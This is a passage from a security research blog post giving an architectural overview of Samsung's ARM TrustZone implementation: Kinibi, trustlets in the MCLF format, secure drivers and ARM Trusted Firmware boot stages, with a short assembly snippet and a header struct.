external\" href=\"https://www.blackhat.com/us-19/briefings/schedule/#breaking-samsungs-arm-trustzone-14932\">Breaking Samsung's ARM TrustZone</a> that was given at BlackHat USA this summer. While an event such as this one is a great opportunity to present a subject we have been working on, many details have to be overlooked to fit the 50-minute format. This blog post, and the following ones, will explain all the details that were missing from the presentation as well as release the different tools mentioned in the talk and developed along the way.</p> \n <p>This series will be split into the three following parts:</p> \n <ul class=\"simple\"> \n  <li><strong>Part 1</strong>: Detailed overview of Samsung's TrustZone components</li> \n  <li><strong>Part 2</strong>: Tools development for reverse engineering and vulnerability research</li> \n  <li><strong>Part 3</strong>: Vulnerability exploitation to reach code execution in EL3 on a Samsung device</li> \n </ul> \n</div> \n<div class=\"section\" id=\"introduction\"> \n <h2>Introduction</h2> \n <p>With the widespread use of mobile devices and embedded systems, security concerns are a priority that vendors need to address. The traditional architecture of a device running an operating system alone is not enough. In this paradigm, a single vulnerability in the kernel could lead to the compromise of the entire system. In response to these issues, vendors conceived new technologies and means to enhance the security of their devices. Among these technologies are <em>Trusted Execution Environments</em>, or TEEs.</p> \n <p>A Trusted Execution Environment is a secure zone in the CPU. It executes concurrently to the main operating system, in an isolated environment. It guarantees that the data and code executing inside the TEE maintain their integrity and confidentiality. This parallel trusted system is conceived to be more secure than the regular environment, called <em>Rich Execution Environment</em>, or REE, by using both hardware and software components to protect code and data alike.</p> \n <p>This article series focuses on the TEE implemented by Samsung using the <a class=\"reference external\" href=\"https://developer.arm.com/ip-products/security-ip/trustzone\">ARM TrustZone</a>, most notably in their older Galaxy devices (S6 to S9). After introducing the different concepts inherent to the TrustZone technology in a first part, this article will provide an explanation on the components and inner workings of the Samsung's TrustZone. A following article will be dedicated to the presentation of the different tools developed to ease the reverse engineering and exploitation processes. Finally, the third article will present different vulnerabilities affecting secure components in TrustZone and demonstrate how they can be exploited to get code execution in EL3, the highest privilege in the ARM architecture.</p> \n</div> \n<div class=\"section\" id=\"arm-trustzone-technology\"> \n <h2>ARM TrustZone Technology</h2> \n <div class=\"section\" id=\"embedded-security-s-current-state\"> \n  <h3>Embedded Security's Current State</h3> \n  <p>The traditional architecture of separating an operating system into userland and kernel space has seen many security improvements throughout the years. However, it does not seem to be enough. Developers have tried to make the attack surface on the kernel as little as possible, strengthening the verifications made on all user-controlled data, yet vulnerabilities can still be found and their exploitation able to compromise the entire system. From these observations, researchers and developers wondered how a system could be better protected, even if the kernel was corrupted at boot time or at runtime.</p> \n  <p>To address the issue of a kernel corruption at boot time, a possible solution would be the <em>Secure Boot</em> mechanism which prevents unauthorized code from executing during the bootloading process (e.g. bootloader stages, operating systems, etc.). A secure boot uses different stages to boot a system and each of them is responsible for loading, executing and verifying the cryptographic signature of the next one. However, using this process requires the first stage to be implicitly trusted. Usually, vendors write this first set of instructions directly into the <em>System-on-Chip</em>'s (SoC) silicon, making it close to impossible to modify it. This first immutable and implicitly trusted stage is called a <em>Bootrom</em>.</p> \n  <p>Runtime corruptions can be mitigated using an hypervisor able to watch over multiple operating systems running concurrently, as shown in the following figure. Hypervisors can detect compromises and ensure the protection of the systems running under their supervision.</p> \n  <img alt=\"\" class=\"align-center\" id=\"hypervisor-based-archi\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/hypervisor-based_arch.png\" style=\"width: 300.40000000000003px; height: 268.40000000000003px;\" /> \n  <p>However, the hypervisor and the guest operating systems are all sharing the same physical memory. The separation between these environments is implemented only via software mechanisms. Under this paradigm, security issues such as virtual machine escapes, hypervisor corruption, etc. cannot be prevented. Taking these limitations into account, a possible enhancement of the system would be to isolate all the components at a hardware level, and thus were created <em>Trusted Execution Environments</em>, or TEEs. These secure and trusted environments use system-wide hardware isolation mechanisms to separate the resources of the CPU and the other peripherals. TrustZone, a TEE implemented by ARM, will be explained in detail in the following sections. In the meantime, an overview of the evolution of system-wide protections can be found in the figure below.</p> \n  <img alt=\"\" class=\"align-center\" id=\"arch-evolution\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/arch_evolution.png\" /> \n </div> \n <div class=\"section\" id=\"existing-tees\"> \n  <h3>Existing TEEs</h3> \n  <p>Several kinds of TEEs can be found on the market, but they can be divided into two categories given below.</p> \n  <ul class=\"simple\"> \n   <li>the TEEs used on desktop platforms, such as Intel SGX. As desktops are not the main subject of this article, these implementations will not be detailed.</li> \n   <li>the TEEs used on mobile platforms, such as TrustZone, <a class=\"reference external\" href=\"https://www.theiphonewiki.com/wiki/Secure_Enclave\">SEP</a>, <a class=\"reference external\" href=\"https://www.blog.google/products/pixel/titan-m-makes-pixel-3-our-most-secure-phone-yet/\">Titan M</a> and others.</li> \n  </ul> \n  <p>The last category can be subdivided in several implementation choices:</p> \n  <div style=\"text-align: center;\"> \n   <img style=\"vertical-align: middle; width: 25%; display: inline-block; margin-right: 20px; vertical-align: middle;\" src=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/virtual_proc.png\" /> \n   <div style=\"display: inline-block; vertical-align: middle; width: 30%;\"> \n    <p>Virtual processor implementation, such as ARM TrustZone, where CPU and hardware resources are shared between a Secure and a Non-Secure state</p> \n   </div> \n  </div> \n  <div style=\"text-align: center;\"> \n   <img style=\"vertical-align: middle; width: 25%; display: inline-block; margin-right: 20px; vertical-align: middle;\" src=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/on_soc.png\" /> \n   <div style=\"display: inline-block; vertical-align: middle; width: 30%;\"> \n    <p>On-Soc processor implementation, such as Apple SEP, where two CPUs, one Secure and one Non-Secure, share hardware resources</p> \n   </div> \n  </div> \n  <div style=\"text-align: center;\"> \n   <img style=\"vertical-align: middle; width: 25%; display: inline-block; margin-right: 20px; vertical-align: middle;\" src=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/off_soc.png\" /> \n   <div style=\"display: inline-block; vertical-align: middle; width: 30%;\"> \n    <p>External Coprocessor implementation, such as Google Titan M, located outside of the SoC, and unable to access hardware resources within the SoC</p> \n   </div> \n  </div> \n  <p>This series of blog posts will focus solely on the ARM&nbsp;TrustZone technology.</p> \n </div> \n <div class=\"section\" id=\"arm-trustzone-software-architecture\"> \n  <h3>ARM TrustZone Software Architecture</h3> \n  <p>This section introduces the ARM TrustZone technology and details its different components and possible implementations. This article is not intended to provide an exhaustive presentation on ARM TrustZone. In the rest of this blog post, the details given will be mainly related to the ARMv8 flavor.</p> \n  <p>TrustZone is a system-wide hardware isolation achieved by separating the CPU into the <em>Normal World</em> and the <em>Secure World</em>. The <em>Normal World</em> contains and executes the main operating system, also called the <em>Rich OS</em> (e.g. Android, GNU/Linux, etc.), which the user primarily interacts with and which performs all the non-sensitive tasks. This operating system is distrusted by design, therefore all data communicated from the <em>Normal World</em> should be thoroughly checked before being used. In parallel exists the <em>Secure World</em>, which runs trusted code and stores/processes sensitive data.</p> \n  <p>In the following sections <em>Normal World</em> and <em>Secure World</em> will be abbreviated NWd and SWd respectively.</p> \n  <p>In order for the CPU to know whether it runs in secure or non-secure state, the ARM architecture uses the least significant bit of the <em>Secure Configuration Register</em>, or SCR, given in the following figure.</p> \n  <img alt=\"\" class=\"align-center\" id=\"scr\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/scr.png\" /> \n  <p>The separation being effective, the system now needs a secure mean of communication between the two worlds. To meet this requirement, ARM introduced the <em>Monitor Mode</em>, responsible for switching between the SWd and the NWd. It runs in secure state at the highest ARM execution level.</p> \n  <p>There are different ways to enter the <em>Monitor Mode</em>. From the NWd, it can be entered using a <em>Secure Monitor Call</em>, or <em>SMC</em>, instruction, through an interrupt or by raising an <em>External Abort</em> exception, as shown in the next figure. The same mechanisms can be used from the SWd in addition to writing directly to the <em>Current Program Status Register</em>, or <em>CPSR</em>, which can only be performed by privileged processes in the SWd.</p> \n  <img alt=\"\" class=\"align-center\" id=\"monitor-comm-nwd\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/monitor_comm_nwd.png\" style=\"width: 415.5px; height: 234.29999999999998px;\" /> \n  <p>To get a better granularity in the permissions management, ARM uses different <em>Exception Levels</em> going from EL0 to EL3 (EL0 being the least privileged and EL3 the most). An overview of the use of these exception levels is given in the figure below.</p> \n  <img alt=\"\" class=\"align-center\" id=\"exception-levels-aarch64\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/exception_levels_aarch64.png\" style=\"width: 481.79999999999995px; height: 295.8px;\" /> \n  <!-- % \\textbf{Note:} a part dealing with the fragmentation of secure world components and how the ARMv8.4 architecture addresses these issues should be added in the final version of this document. --> \n  <p>ARM provides all the necessary tools to vendors for them to build their own TrustZone implementation. There are few limitations and the SWd implementation can range from a simple library acting as an API, like in the Nintendo Switch, to a full-fledged operating system, such as the ones implemented by Samsung and Qualcomm, passing through intermediate solutions that we have never encountered yet:</p> \n  <img alt=\"\" class=\"align-center\" id=\"tz-implementations\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/tz_archi.png\" style=\"width: 355.0px; height: 248.0px;\" /> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/tz_archi_lib.png\" style=\"width: 354.0px; height: 245.5px;\" /> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/tz_archi_intermediate.png\" style=\"width: 355.5px; height: 246.0px;\" /> \n  <p>The following section focuses on the Samsung's TrustZone implementation, its different components and their inner workings.</p> \n </div> \n</div> \n<div class=\"section\" id=\"samsung-s-trustzone-reverse-engineering\"> \n <h2>Samsung's TrustZone Reverse Engineering</h2> \n <div class=\"section\" id=\"samsung-s-implementation-overview\"> \n  <span id=\"sec-samsung-overview\"></span> \n  <h3>Samsung's Implementation Overview</h3> \n  <p>Samsung is one of the major OEM and, as such, tries to stay up-to-date with current technologies and provides as many features as possible to their customers. They have now used TrustZone in their devices for several years, starting with the Galaxy S3. On Exynos-based Galaxy devices, they started by using the implementation provided by Qualcomm before switching to their own (starting from the S6 for Galaxy models).</p> \n  <p>Generally, TrustZone is used to access hardware-backed features and to perform sensitive operations in a supervised manner (e.g. cryptographic engine, credentials storage, etc.). Samsung heavily uses TrustZone for <a class=\"reference external\" href=\"https://www.samsungknox.com/en\">Samsung Knox</a>, a system-wide security toolbox developed by Samsung. Among the different components that constitute Knox, the <em>Secure Storage API</em> and the <em>TrustZone-based Integrity Measurement Architecture</em>, or TIMA for short, are two examples that rely on TrustZone to perform their operations. Knox also serves as a foundation to provide different services such as Samsung Pay, Samsung Pass, etc.</p> \n  <p>The current implementation, which is discussed in greater details in the sections <a class=\"reference internal\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#sec-samsung-kinibi\">Trustonic's Trusted OS Kinibi</a> and <a class=\"reference internal\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#sec-samsung-atf\">ARM Trusted Firmware (ATF) and Samsung's Monitor</a>, uses a modified version of the <em>Arm Trusted Firmware</em>, for the Secure Monitor, and a trusted operating system named <em>Kinibi</em>, which is developed by Trustonic.</p> \n  <p>Samsung uses the ATF project to implement their Secure Monitor and modified some part of it to make it fit their needs. They added their own <em>runtime services</em> which are used to supply custom SMC handlers without having to touch the current ones. For example, one of the added SMC handlers is responsible for registering Kinibi's vector base address for SMCs handled by the Trusted OS.</p> \n  <p>As explained earlier, Kinibi, which this article series focuses on, is available on older devices (e.g. from the S6 to the S9 for Galaxy models). However, in more recent models such as the Galaxy S10, Samsung abandoned Kinibi for their own trusted OS called TEEGRIS. At the time of writing, and as far as we know, there are currently few resources available on the subject apart from a blog post by Alexander Tarasikov <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#teegris\" id=\"id1\">[TEEGRIS]</a>.</p> \n  <p>The following sections give more details on the TrustZone implementation based on Kinibi and the different components it is made of.</p> \n </div> \n <div class=\"section\" id=\"trusted-applications\"> \n  <h3>Trusted Applications</h3> \n  <p><em>Trusted Applications</em>, or trustlets, are the SWd counterpart to regular userland applications found in the NWd. As the trusted OS functionalities are limited, especially in the case of a micro-kernel, trusted applications can be used to extend them. It also provides a mean to lower the privileges needed by a process to perform a given task.</p> \n  <p>Trustlets are developed by trusted software vendors who need access to the TrustZone capabilities in order to enhance the security of their NWd applications. For example, streaming applications might need to use a DRM to protect digital content and this DRM could be implemented in a trusted application, like Widevine does, thus keeping the decryption keys from the NWd.</p> \n  <!-- Trusted Applications and Secure Drivers are regular ARM binaries that make use of a different set of APIs. These binaries can usually be found on the file-system, or they can be embedded in the TZOS' binary. --> \n  <!-- On Samsung devices equipped with an Exynos SOC, the trustlets are located inside the \\texttt{/system/app/mcRegistry} folder. The file's base name represents the trustlet's UUID and its extension is either \\texttt{.tlbin} or \\texttt{.drbin}. While an \\texttt{.tlbin} extension doesn't always indicate that a binary is TA and not a SD, there exists another way to discriminate them: --> \n  <!-- \\begin{itemize} --> \n  <!-- \\item a filename starting with \\texttt{ffffffff} denotes a Trusted Application; --> \n  <!-- \\item a filename starting with \\texttt{fffffffd} denotes a Secure Driver. --> \n  <!-- \\end{itemize} --> \n  <div class=\"section\" id=\"mclf-format\"> \n   <h4>MCLF Format</h4> \n   <p>The trustlets used in the Samsung's Trustzone are executables using a proprietary file format called <em>Mobicore Loadable Format</em>, or MCLF. This format is pretty simple, which was useful to emulate trustlets as it will be discussed in the section dedicated to vulnerability research.</p> \n   <p>The MCLF header contains multiple information about the trustlet, including, but not limited to:</p> \n   <ul class=\"simple\"> \n    <li>its type;</li> \n    <li>its UUID;</li> \n    <li>its entrypoint;</li> \n    <li>the addresses and sizes of its segments.</li> \n   </ul> \n   <p>Every trustlet is comprised of three segments:</p> \n   <ul class=\"simple\"> \n    <li>the <tt class=\"docutils literal\">text</tt> segment that contains the trustlet's code;</li> \n    <li>the <tt class=\"docutils literal\">data</tt> that contains its initialised data;</li> \n    <li>the <tt class=\"docutils literal\">bss</tt> segment that contains its uninitialised data.</li> \n   </ul> \n   <p>After the MCLF header and segments data, the binary contains an embedded public key and a signature blob. When a trustlet is being loaded into the TEE, the hash of the public key is compared against an embedded hash within the TZOS binary, then the signature of the trustlet is verified. This mechanism prevents unauthorized developers from running their own code in TrustZone, only trusted vendors can get their trustlets to be signed by the OEM.</p> \n   <img alt=\"\" class=\"align-center\" id=\"ta-kinibi-format\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/TA_kinibi_format.png\" style=\"width: 529.0px; height: 154.0px;\" /> \n   <!-- BLOGPOST_REF --> \n   <p><strong>Note:</strong> to ease the reversing process of trusted applications, an IDA Pro loader for MCLF binaries written by Gassan Idriss can be used <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#ida-loader\" id=\"id2\">[IDA_LOADER]</a>. A loader was also developed for GHIDRA and will be introduced in the second blog post.</p> \n  </div> \n  <div class=\"section\" id=\"communicating-with-a-trustlet\"> \n   <h4>Communicating With a Trustlet</h4> \n   <p>Communications between the NWd and the SWd are performed using Software Interrupts (SWI) and World Shared Memory (WSM) buffers. SWI allows transferring the execution between the two worlds, while WSM buffers allow the transfer of data. In Trustonic's terminology, these shared buffers are called TCI when communicating with a trustlet, and DCI when communicating with a secure driver, a special type of trusted applications with higher privileges detailed in the section <a class=\"reference internal\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#sec-secure-drivers\">Secure Drivers</a>.</p> \n  </div> \n  <div class=\"section\" id=\"mclib-shared-library\"> \n   <h4>McLib Shared Library</h4> \n   <p>Some functionalities can be shared between trustlets and need not be redeveloped by every vendors. To this end, Trustonic provides an equivalent to the libc called the McLib (certainly for <em>MobiCore Library</em>). It is used by trustlets and secure drivers alike, but permissions are checked to prevent trustlets from accessing privileged functions. It implements functions such as <tt class=\"docutils literal\">tlApiMalloc</tt>, <tt class=\"docutils literal\">tlApiRandomGenerateData</tt>, etc. These functions are usually called <tt class=\"docutils literal\">tlApi</tt> for trustlets and <tt class=\"docutils literal\">drApi</tt> for secure drivers.</p> \n   <p>This library is not loaded dynamically by the trustlets. The address of the McLib's handler is written into them at load time and then used as a regular function as shown in the code snippet given below. The tlApi number is passed into <tt class=\"docutils literal\">R0</tt> and the arguments in the rest of the general purpose registers or on the stack, depending on the number of arguments.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"p\">;</span> <span class=\"n\">tlApiLibEntry</span> <span class=\"n\">is</span> <span class=\"n\">the</span> <span class=\"n\">address</span> <span class=\"n\">of</span> <span class=\"n\">the</span> <span class=\"n\">McLib</span> <span class=\"n\">handler</span>\n\n<span class=\"n\">tlApiWaitNotification</span>\n<span class=\"n\">MOV</span><span class=\"p\">.</span><span class=\"n\">W</span>           <span class=\"n\">R1</span><span class=\"p\">,</span> <span class=\"err\">#</span><span class=\"mh\">0x1000</span>\n<span class=\"n\">LDR</span><span class=\"p\">.</span><span class=\"n\">W</span>           <span class=\"n\">R2</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"n\">R1</span><span class=\"p\">,</span><span class=\"err\">#</span><span class=\"p\">(</span><span class=\"n\">tlApiLibEntry</span> <span class=\"o\">-</span> <span class=\"mh\">0x1000</span><span class=\"p\">)]</span>\n<span class=\"n\">MOV</span>             <span class=\"n\">R1</span><span class=\"p\">,</span> <span class=\"n\">R0</span>\n<span class=\"n\">MOVS</span>            <span class=\"n\">R0</span><span class=\"p\">,</span> <span class=\"err\">#</span><span class=\"mi\">6</span>\n<span class=\"n\">BX</span>              <span class=\"n\">R2</span>\n</pre> \n   </div> \n  </div> \n  <div class=\"section\" id=\"trustlet-life-cycle\"> \n   <h4>Trustlet Life-Cycle</h4> \n   <p>Trusted applications have their own address space and are always loaded at virtual address <tt class=\"docutils literal\">0x1000</tt>. Once they are running, they usually follow the same execution flow. They start by initializing different components, such as the stack, and then check the size of the TCI buffer sent from the NWd. Afterwards, the trustlet waits for commands in the TCI buffer using the McLib function <tt class=\"docutils literal\">tlApiWaitNotification</tt>, handles these commands accordingly and sends back the result to the NWd using <tt class=\"docutils literal\">tlApiNotify</tt>. This execution flow is illustrated in the figure below.</p> \n   <img alt=\"\" class=\"align-center\" id=\"ta-life-cycle\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/ta_life_cycle.png\" /> \n   <p>From an attacker point of view, the attack surface of the whole trustlet usually amounts to the one of the command handlers. These handlers mostly process user-provided data and must thoroughly check that every argument passed from the NWd respects the expected format. If an attacker were to obtain code execution in a trustlet, they would not be able to do much. However, they would be able to attack higher privileged processes, such as Kinibi itself or secure drivers, both of which are discussed in the following sections.</p> \n  </div> \n </div> \n <div class=\"section\" id=\"secure-drivers\"> \n  <span id=\"sec-secure-drivers\"></span> \n  <h3>Secure Drivers</h3> \n  <p>Secure drivers are a special flavor of trusted applications executing in the Secure World's userland, but with higher privileges relatively to trustlets. These extra privileges boil down to the access to additional SVCs (Supervisor Calls), such as the ability to map specific physical memory ranges, using threads, or being able to make SMC, as detailed below.</p> \n  <p>Trustlets and secure drivers can communicate using IPCs and by marshalling the parameters sent. Secure drivers serve as interfaces for trustlets to access peripherals in a controlled manner. To access peripherals, secure drivers need to be able to map their physical memory, which is made possible using the functions <tt class=\"docutils literal\">drApiMapPhys</tt>, <tt class=\"docutils literal\">drApiUnmap</tt>, <tt class=\"docutils literal\">drApiVirt2Phys</tt>, etc.</p> \n  <p>Another distinctive feature is the fact that drivers are multi-threaded applications. The common threads encountered are:</p> \n  <ul class=\"simple\"> \n   <li>a main thread acting as an exception handler;</li> \n   <li>a DCI thread handling NWd messages;</li> \n   <li>an IPC thread handling system/trustlets messages;</li> \n   <li>an ISR thread handling interrupts.</li> \n  </ul> \n  <img alt=\"\" class=\"align-center\" id=\"secure-driver\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/secure_driver.png\" /> \n  <div class=\"section\" id=\"main-thread\"> \n   <h4>Main Thread</h4> \n   <p>This thread usually starts by initializing the hardware resources. It is also responsible for starting all the other threads described in this section. If one of the threads being run raises an exception, the main thread handles it and restarts the thread if needed.</p> \n  </div> \n  <div class=\"section\" id=\"dci-thread\"> \n   <h4>DCI Thread</h4> \n   <p>It is possible to communicate with a secure driver directly from the NWd. The system used is similar to the one implemented by trustlets and is based on a world-shared memory region called a DCI buffer. Commands and arguments are sent directly from the NWd in this buffer and a similar notification system based on <tt class=\"docutils literal\">drApiIpcSigWait</tt> and <tt class=\"docutils literal\">drApiNotify</tt> is used. Vulnerabilities in this handler could be exploited to get direct access to a secure driver from the NWd without passing through a trustlet.</p> \n  </div> \n  <div class=\"section\" id=\"ipc-thread\"> \n   <h4>IPC Thread</h4> \n   <p>When reverse engineering a secure driver, the IPC handler is usually the interesting one. It can be identified by the call to <tt class=\"docutils literal\">drApiIpcCallToIPCH</tt>, the drApi function waiting for IPC messages. Arguments are passed into a single buffer to respect the data format required by the IPCs. When an IPC is received from a trustlet, the memory of the trustlet needs to be mapped into the address space of the secure driver, using the function <tt class=\"docutils literal\">drApiMapClientAndParams</tt>, so it can be accessed. Moreover, if pointers are sent as arguments, they need to be checked and translated to the address space of the driver to prevent out-of-band access. This operation can be performed by calling <tt class=\"docutils literal\">drApiAddrTranslateAndCheck</tt>.</p> \n  </div> \n  <div class=\"section\" id=\"isr-thread\"> \n   <h4>ISR Thread</h4> \n   <p>This thread simply attaches to an interrupt using <tt class=\"docutils literal\">drApiIntrAttach</tt> and waits for an interrupt to occur by calling <tt class=\"docutils literal\">drApiWaitForIntr</tt>. Detaching from an interrupt is done by calling <tt class=\"docutils literal\">drApiIntrDetach</tt>.</p> \n  </div> \n </div> \n <div class=\"section\" id=\"trustonic-s-trusted-os-kinibi\"> \n  <span id=\"sec-samsung-kinibi\"></span> \n  <h3>Trustonic's Trusted OS Kinibi</h3> \n  <p>Kinibi is a 32-bit micro-kernel developed by Trustonic and is implemented in Samsung's TrustZone as its trusted OS. Even though Samsung Galaxy devices are based on a 64-bit architecture, Kinibi is able to run thanks to the ARMv8 AArch32 compatibility mode. This section details Kinibi's architecture on devices ranging from the Samsung Galaxy S6 to the Galaxy S9. The foundation of this research is based on the Ekoparty talk and the series of blog posts, entitled <em>Unbox Your Phone</em> and released by Daniel Komaromy <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#unbox\" id=\"id3\">[UNBOX]</a>, presenting parts of Kinibi's internals.</p> \n  <p>Since Kinibi is a micro-kernel, it is comprised of multiple components. These components are referenced in a table called <tt class=\"docutils literal\">image header</tt> and found in Kinibi's binary, as shown in the following figure.</p> \n  <img alt=\"\" class=\"align-center\" id=\"img-hdr\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/img_hdr.png\" /> \n  <p>This table can be found in the binary by searching the marker \"t-base\" or \"tee\". The first element of this table represents the TEE-OS itself while the others are the components inside the TEE-OS. Elements stored in this table can be represented using the structure given in the snippet below.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"k\">struct</span> <span class=\"n\">element</span> <span class=\"p\">{</span>\n  <span class=\"kt\">char</span> <span class=\"n\">name</span><span class=\"p\">[</span><span class=\"mi\">8</span><span class=\"p\">];</span>\n  <span class=\"kt\">int</span> <span class=\"n\">offset</span><span class=\"p\">;</span>\n  <span class=\"kt\">int</span> <span class=\"n\">size</span><span class=\"p\">;</span>\n  <span class=\"kt\">char</span> <span class=\"n\">padding</span><span class=\"p\">[</span><span class=\"mh\">0x10</span><span class=\"p\">];</span>\n<span class=\"p\">}</span>\n</pre> \n  </div> \n  <p>Brief descriptions of these components are given in the list below.</p> \n  <ul class=\"simple\"> \n   <li><strong>mtk:</strong> Micro T-base Kernel, the actual kernel, as its name suggests, responsible for performing privileged operations;</li> \n   <li><strong>img-hdr:</strong> the table describing Kinibi's elements;</li> \n   <li><strong>mclib:</strong> the shared library implementing frequently used functions, similarly to the libc;</li> \n   <li><strong>rtm:</strong> the <em>Run-Time Manager</em>;</li> \n   <li><strong>drcrypt:</strong> the <em>Crypto Driver</em>;</li> \n   <li><strong>tlproxy:</strong> the <em>Secure File System library</em> for trustlets;</li> \n   <li><strong>sth2:</strong> the <em>Secure File System</em> for secure drivers;</li> \n   <li><strong>(Samsung S9) rpmb:</strong> this component is unknown at the moment.</li> \n  </ul> \n  <p>The whole architecture is illustrated in the next figure.</p> \n  <img alt=\"\" class=\"align-center\" id=\"kinibi-archi-reverser\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/kinibi_archi_reverser.png\" /> \n  <div class=\"section\" id=\"run-time-manager\"> \n   <h4>Run-Time Manager</h4> \n   <p>One of the most important and critical component is the <em>Run-Time Manager</em>, or RTM for short. RTM is a special SWd user-space process equivalent to the init process on Linux. RTM is always the first process started by Kinibi and is then tasked with managing all the other processes. RTM is also responsible for several operations, such as:</p> \n   <ul class=\"simple\"> \n    <li>starting processes;</li> \n    <li>notifying trustlets of incoming data from the NWd;</li> \n    <li>handling inter-process communications;</li> \n    <li>implementing the <em>Mobicore Control Protocol</em>.</li> \n   </ul> \n   <p>Among other things, RTM is responsible for all of Kinibi's communication mechanisms. These mechanisms are described in the following section.</p> \n  </div> \n  <div class=\"section\" id=\"internal-and-external-communication-of-kinibi\"> \n   <h4>Internal and external communication of Kinibi</h4> \n   <p>Since Kinibi is a micro-kernel, IPCs are a fundamental requirement of its design. It allows all the components described in the previous section to interact with each other and exchange information. Kinibi also needs to communicate with the NWd. To answer both of these needs, Trustonic has implemented two communication channels within RTM, explained below, which use the different mechanisms offered by the ARM architecture.</p> \n   <p>The communication channel with the NWd is called the <em>Mobicore Communication Interface</em>, or MCI, and is based on a custom protocol called <em>Mobicore Control Protocol</em>, or MCP. It is built upon six SMC fastcalls listed below.</p> \n   <ul class=\"simple\"> \n    <li>SMC fastcalls that can be sent directly to the monitor to switch the processor state: \n     <ul> \n      <li><strong>MC_SMC_N_YIELD</strong></li> \n      <li><strong>MC_SMC_N_SIQ</strong></li> \n     </ul> </li> \n    <li>SMC fastcalls that can be sent to RTM: \n     <ul> \n      <li><strong>MC_FC_INIT</strong> is used to configure the sending and receiving notification queues;</li> \n      <li><strong>MC_FC_INFO</strong> is used to get different information about the system, such as Kinibi's version information;</li> \n      <li><strong>MC_FC_SWAP_CPU</strong> is used to move Kinibi to a specific CPU core;</li> \n      <li><strong>MC_FC_MEM_TRACE</strong> is used to enable SWd tracing via memory.</li> \n     </ul> </li> \n   </ul> \n   <!-- The implementation of these *Notification Queues* is described in the file `./drivers/gud/gud-exynos9810/MobiCoreDriver/nq.c <./drivers/gud/gud-exynos9810/MobiCoreDriver/nq.c>`_. --> \n   <!-- These commands are defined in the file \\texttt{./drivers/gud/gud-exynos8890/MobiCoreDriver/mci/mcimcp.h} and allow to load/suspend/resume trustlets, map and unmap additional shared memory for a Trustlet. --> \n   <!-- Lignes commentées pour le moment, on verra quand on aura ajouté toutes les refs, etc. --> \n   <p>The MCI relies on shared buffers called <em>Notification Queues</em>. SMCs are only used to setup these buffers and to notify the secure monitor about them. The notification is then transferred to Kinibi, which then transfers it to RTM. MCP commands from the NWd are added to these queues and are then received and interpreted by RTM to act on the secure components running in TrustZone. It allows RTM to know whether it needs to load, suspend or resume a trustlet, map or unmap additional shared memory, etc.</p> \n   <p>The internal communication channel does not have a particular name and provides a medium for IPCs. This channel relies on the <tt class=\"docutils literal\">SVC 0x11</tt>.</p> \n  </div> \n </div> \n <div class=\"section\" id=\"arm-trusted-firmware-and-samsung-s-monitor\"> \n  <span id=\"sec-samsung-atf\"></span> \n  <h3>ARM Trusted Firmware and Samsung's Monitor</h3> \n  <p>As explained earlier, the implementation used by Samsung for their monitor is based on the <em>ARM Trusted Firmware</em>. It can be found in the <em>Samsung Bootloader</em>, or SBOOT, which is a proprietary bootloader developed by Samsung for Exynos-based devices. ATF is pretty complex, however an analysis made by Fernand Lone Sang is available on Quarkslab's blog <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#sboot\" id=\"id4\">[SBOOT]</a>. Interested readers are encouraged to read his article, since it provides interesting details on the internals of the monitor. It also explains how Kinibi can be located and extracted from the SBOOT binary.</p> \n  <p>For devices running in the AArch64 processor state, ATF defines 5 sequential stages for the bootloader:</p> \n  <ul class=\"simple\"> \n   <li><strong>Stage 1 (BL1)</strong>: AP Trusted ROM;</li> \n   <li><strong>Stage 2 (BL2)</strong>: Trusted Boot Firmware;</li> \n   <li><strong>Stage 3-1 (BL31)</strong>: EL3 Runtime Software;</li> \n   <li><strong>Stage 3-2 (BL32)</strong>: Secure-EL1 Payload (optional);</li> \n   <li><strong>Stage 3-3 (BL33)</strong>: Non-trusted Firmware.</li> \n  </ul> \n  <p>Some implementations might embed both BL1 and BL2 into the bootrom or might not need them at all. ATF handles this use case by allowing a board to reset directly to BL31.</p> \n  <p>SBOOT components are listed below and an illustration is also available in the next figure.</p> \n  <ul class=\"simple\"> \n   <li><strong>BL1:</strong> the Exynos bootrom;</li> \n   <li><strong>BL31:</strong> the EL3 runtime software based on the open-source Arm Trusted Firmware (ATF);</li> \n   <li><strong>BL33:</strong> the Trusted Execution Environment OS (TEE-OS), the firmware 